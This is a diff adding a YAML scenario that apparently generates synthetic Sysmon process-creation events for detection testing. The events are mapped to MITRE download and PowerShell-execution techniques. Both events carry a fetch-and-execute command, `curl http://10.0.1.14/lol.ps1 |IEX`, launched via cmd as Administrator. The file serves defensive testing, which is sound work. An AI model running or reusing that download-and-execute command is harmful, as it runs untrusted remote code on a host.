@@ -1,0 +1,192 @@
+type: scenario
+description: |
+  A command shell starts PowerShell with a one-line command that fetches a
+  script over HTTP and pipes the response straight into Invoke-Expression.
+  Sysmon EID 1 (Process Create) records cmd.exe, started from another cmd.exe
+  shell, running `cmd /c powershell -c` with a PowerShell command, for example
+  `&{ curl http://10.0.1.14/lol.ps1 |IEX }` (in Windows PowerShell, curl and
+  wget are aliases of Invoke-WebRequest and IEX is an alias of
+  Invoke-Expression). A second Sysmon EID 1 records the powershell.exe process
+  that cmd.exe starts with the same command. The events record the launch and
+  the command line, not whether the download or the script succeeded.
+tags: [eid1]
+mitre:
+  tactics: [command-and-control, execution]
+  techniques: [T1105, T1059.001]
+
+state:
+  domain_short:         CORP
+  domain_tld:           local
+  domain_short_lower:   fn.lower(ref.domain_short)
+  domain_fqdn:          "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:             gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  sysmon_pid:           gen.int(min=1000, max=4000)
+  sysmon_tid:           gen.int(min=1000, max=9999)
+  user_name:            Administrator
+  user:                 "${ref.domain_short}\\${ref.user_name}"
+  current_directory:    "C:\\Users\\${ref.user_name}\\"
+  logon_guid_raw:       gen.uuid()
+  logon_guid:           "{${ref.logon_guid_raw}}"
+  logon_id_hex:         gen.hex(len=6, case=lower)
+  logon_id:             "0x${ref.logon_id_hex}"
+  shell_guid_raw:       gen.uuid()
+  shell_process_guid:   "{${ref.shell_guid_raw}}"
+  shell_process_id:     gen.int(min=1000, max=9999)
+  wrapper_guid_raw:     gen.uuid()
+  wrapper_process_guid: "{${ref.wrapper_guid_raw}}"
+  wrapper_process_id:   gen.int(min=1000, max=9999)
+  process_guid_raw:     gen.uuid()
+  process_guid:         "{${ref.process_guid_raw}}"
+  process_id:           gen.int(min=1000, max=9999)
+  wrapper_record_id:    gen.int(min=5000, max=4999999)
+  process_record_id:    gen.int(min=5000000, max=9999999)
+  powershell_command:   "&{ curl http://10.0.1.14/lol.ps1 |IEX }"
+  wrapper_command_line: 'cmd  /c powershell -c "${ref.powershell_command}"'
+  command_line:         'powershell  -c "${ref.powershell_command}"'
+
+steps:
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.wrapper_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.wrapper_process_guid
+            - "@Name": ProcessId
+              "#text": ref.wrapper_process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.20348.3932 (WinBuild.160101.0800)"
+            - "@Name": Description
+              "#text": Windows Command Processor
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": Cmd.Exe
+            - "@Name": CommandLine
+              "#text": ref.wrapper_command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": 2
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": "MD5=8903A3381FBB033A45F5C2C50C175C54,SHA256=F7C237A49B96FD77C047910E13F24AAC4678A0F94BABDB06643DBA63F38D48E5,IMPHASH=D60B77062898DC6BFAE7FE11A0F8806C"
+            - "@Name": ParentProcessGuid
+              "#text": ref.shell_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.shell_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": ParentCommandLine
+              "#text": '"C:\Windows\system32\cmd.exe" '
+            - "@Name": ParentUser
+              "#text": ref.user
+
+  - emit:
+      event_type: windows.wineventlog@v1
+      fields:
+        System:
+          Provider:
+            "@Name": Microsoft-Windows-Sysmon
+            "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"
+          EventID: 1
+          Version: 5
+          Level: 4
+          Task: 1
+          Opcode: 0
+          Keywords: "0x8000000000000000"
+          TimeCreated:
+            "@SystemTime": gen.timestamp(format=wineventlog)
+          EventRecordID: ref.process_record_id
+          Correlation: {}
+          Execution:
+            "@ProcessID": ref.sysmon_pid
+            "@ThreadID": ref.sysmon_tid
+          Channel: Microsoft-Windows-Sysmon/Operational
+          Computer: ref.computer
+          Security:
+            "@UserID": S-1-5-18
+        EventData:
+          Data:
+            - "@Name": RuleName
+              "#text": "-"
+            - "@Name": UtcTime
+              "#text": gen.timestamp(format=sysmon)
+            - "@Name": ProcessGuid
+              "#text": ref.process_guid
+            - "@Name": ProcessId
+              "#text": ref.process_id
+            - "@Name": Image
+              "#text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            - "@Name": FileVersion
+              "#text": "10.0.20348.2849 (WinBuild.160101.0800)"
+            - "@Name": Description
+              "#text": Windows PowerShell
+            - "@Name": Product
+              "#text": "Microsoft® Windows® Operating System"
+            - "@Name": Company
+              "#text": Microsoft Corporation
+            - "@Name": OriginalFileName
+              "#text": PowerShell.EXE
+            - "@Name": CommandLine
+              "#text": ref.command_line
+            - "@Name": CurrentDirectory
+              "#text": ref.current_directory
+            - "@Name": User
+              "#text": ref.user
+            - "@Name": LogonGuid
+              "#text": ref.logon_guid
+            - "@Name": LogonId
+              "#text": ref.logon_id
+            - "@Name": TerminalSessionId
+              "#text": 2
+            - "@Name": IntegrityLevel
+              "#text": High
+            - "@Name": Hashes
+              "#text": "MD5=DD6F4B7818A253887B8EA86515F6FB7D,SHA256=38F4384643B3FA0DE714D2367B712C2E0FA1C89E2CFD131AE6B831AD962B1033,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77"
+            - "@Name": ParentProcessGuid
+              "#text": ref.wrapper_process_guid
+            - "@Name": ParentProcessId
+              "#text": ref.wrapper_process_id
+            - "@Name": ParentImage
+              "#text": "C:\\Windows\\System32\\cmd.exe"
+            - "@Name": ParentCommandLine
+              "#text": ref.wrapper_command_line
+            - "@Name": ParentUser
+              "#text": ref.user
